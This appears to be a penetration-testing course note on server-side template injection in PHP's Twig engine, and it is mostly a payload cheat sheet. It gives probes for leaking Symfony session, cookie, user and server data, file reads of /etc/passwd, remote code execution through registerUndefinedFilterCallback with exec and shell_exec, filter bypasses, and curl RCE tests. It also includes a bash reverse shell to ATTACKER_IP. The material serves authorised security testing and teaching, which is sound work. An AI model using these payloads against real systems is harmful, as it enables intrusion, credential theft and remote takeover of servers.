---
tags: [vapt, ssti, advanced]
difficulty: advanced
module: "09 - SSTI"
topic: "09.05 SSTI in Twig (PHP)"
---

# 09.05 — SSTI in Twig (PHP)

## Twig Basics

Twig is the default template engine for Symfony and commonly used in Drupal, Laravel (via Blade), and many PHP frameworks.

```php
// NORMAL TWIG SYNTAX:
{{ variable }}          → outputs variable
{{ 7*7 }}               → 49
{{ "hello"|upper }}     → HELLO
{% if x %} ... {% endif %}
{% for item in items %} ... {% endfor %}

// DETECTION:
{{7*7}}     → 49 = could be Jinja2 or Twig
{{7*'7'}}   → 49 = TWIG (PHP casts string '7' to int 7, multiplies!)
           → 7777777 = Jinja2 (Python repeats string!)
```

---

## Twig-Specific Data Leakage

```php
// ACCESS TWIG ENVIRONMENT:
{{_self}}                    → current template object
{{_self.env}}                → Twig environment
{{_context}}                 → all template variables (may have DB creds!)

// SYMFONY-SPECIFIC:
{{app}}                      → Symfony Application object
{{app.request}}              → HTTP Request
{{app.request.server.all()}} → SERVER variables (PHP $_SERVER equivalent!)
{{app.request.cookies.all()}} → all cookies
{{app.session}}              → session data
{{app.user}}                 → current authenticated user
{{app.user.username}}        → username
{{app.user.password}}        → hashed password (if passed to template)
{{app.user.roles}}           → user roles (ADMIN? USER?)

// ENVIRONMENT VARIABLES VIA SERVER VARS:
{{app.request.server.get('DOCUMENT_ROOT')}}
{{app.request.server.get('SERVER_ADDR')}}
{{dump(app)}}                → dumps full app object (debug mode!)
```

---

## Reading Files in Twig

```php
// TWIG DOESN'T HAVE FILE READ BUILT-IN
// BUT: Can access PHP source via various methods

// IF source() FUNCTION IS ENABLED:
{{source('/etc/passwd')}}       → reads file content!
{{source('../../../etc/passwd')}} → path traversal + read

// VIA _SELF.ENV AND GETLOADER:
{{_self.env.getLoader()}}      → get template loader
{{_self.env.getLoader().getPaths()}} → get template paths

// READ FILE IF FILE() IS ACCESSIBLE:
{{_self.env.setCache(false)}}   ← disable cache (to allow new template loading)
{{_self.env.loadTemplate("../../../etc/passwd")}}  ← load as template

// ALTERNATIVE: PHP FUNCTIONS VIA TWIG EXTENSIONS
// If developer added dangerous extensions:
{{file_get_contents('/etc/passwd')}}
```

---

## RCE in Twig

```php
// TWIG DOESN'T ALLOW DIRECT PHP FUNCTION CALLS BY DEFAULT
// But several bypasses exist:

// METHOD 1 — FILTER WITH CUSTOM PHP FUNCTION (if registered):
// If developer registered system() as a Twig filter:
{{'id'|system}}

// METHOD 2 — TWIG EXTENSIONS:
// If a custom extension exposes exec, shell_exec, etc.:
{{'id'|exec}}

// METHOD 3 — Via _self and Twig internals:
{{_self.env.registerUndefinedFilterCallback("exec")}}
{{_self|filter("id")}}
// Explanation:
// registerUndefinedFilterCallback("exec") → register PHP exec as filter
// _self|filter("id") → runs exec("id")!

// STEP BY STEP:
{{_self.env.registerUndefinedFilterCallback("exec")}}
{{_self.env.registerUndefinedFilterCallback("shell_exec")}}
{{"id"|filter}}
// or combine:
{{_self.env.registerUndefinedFilterCallback("exec")}}{{"id"|filter}}

// METHOD 4 — PHP OBJECT METHODS (if Symfony objects available):
{{app.request.request.get('cmd')}}  ← read POST param 'cmd'
// Combined with template that calls the value:
// POST data: cmd=id
// Template: {{app.request.request.get('cmd')|exec}}

// METHOD 5 — setRawBlock:
{% set string %}<?php system($_GET['cmd']); ?>{% endset %}
{{string}}  ← may not execute PHP in Twig
```

---

## Twig Filter-Based RCE (Most Reliable)

```php
// THE MOST RELIABLE TWIG RCE:

// STEP 1: Register PHP's exec as a Twig filter:
{{_self.env.registerUndefinedFilterCallback("exec")}}

// STEP 2: Call any command through the registered filter:
{{_self.env.registerUndefinedFilterCallback("exec")}}{{"id"|filter}}
// OR:
{{"id"|exec}}  ← if exec filter is somehow registered already

// FULL RCE WITH OUTPUT:
{{_self.env.registerUndefinedFilterCallback("shell_exec")}}{{"id"|filter}}
// shell_exec returns output (exec doesn't by default)

// REVERSE SHELL:
{{_self.env.registerUndefinedFilterCallback("shell_exec")}}{{"bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"|filter}}
```

---

## Twig Specific Bypass

```php
// IF DOT NOTATION BLOCKED:
{{app['request']}}           ← bracket notation
{{app.request['server']}}    ← mixed

// IF UNDERSCORE FILTERED:
// _self uses underscore — tricky to bypass in strict WAFs
// Try: {{_self}} with encoded underscore
{{'\x5fself'}}              ← hex-encoded underscore

// BYPASS DOUBLE BRACE FILTER:
// Use Twig's alternative block syntax:
{%if 1==1%}SSTI{%endif%}    ← uses if blocks
```

---

## Twig vs Jinja2 Cheat Sheet

```
OPERATION         JINJA2                    TWIG
---------         ------                    ----
Variable          {{ var }}                 {{ var }}
Math              {{ 7*7 }}                 {{ 7*7 }}
String*Int        {{ 7*'7' }} = 7777777     {{ 7*'7' }} = 49 ← KEY DIFFERENCE
Filter            {{ var|upper }}           {{ var|upper }}
Read file         cycler.__init__...        {{source('/etc/passwd')}}
RCE               cycler...os.popen()       registerUndefinedFilterCallback
Config leak       {{config}}                {{_context}}
App object        N/A (Flask specific)      {{app}} (Symfony)
```

---

## Automated Detection

```bash
# TWIG DETECTION WITH CURL:
curl -s "https://target.com/?name={{7*7}}" | grep "49"
curl -s "https://target.com/?name={{7*'7'}}" | grep "49"
# If {{7*7}} = 49 AND {{7*'7'}} = 49 → TWIG (PHP)!

# CONFIRM WITH TWIG-SPECIFIC:
curl -s "https://target.com/?name={{_self}}" | grep -i "twig"

# RCE TEST:
curl -s "https://target.com/?name={{_self.env.registerUndefinedFilterCallback('shell_exec')}}{{'id'|filter}}"
# Look for: uid=... in response
```

---

## Related Notes
- [[03 - Detecting SSTI]] — detection methodology
- [[04 - SSTI in Jinja2]] — Jinja2 for comparison
- [[08 - SSTI to RCE Escalation]] — escalation guide
- [[10 - SSTImap Tool Usage]] — automated exploitation
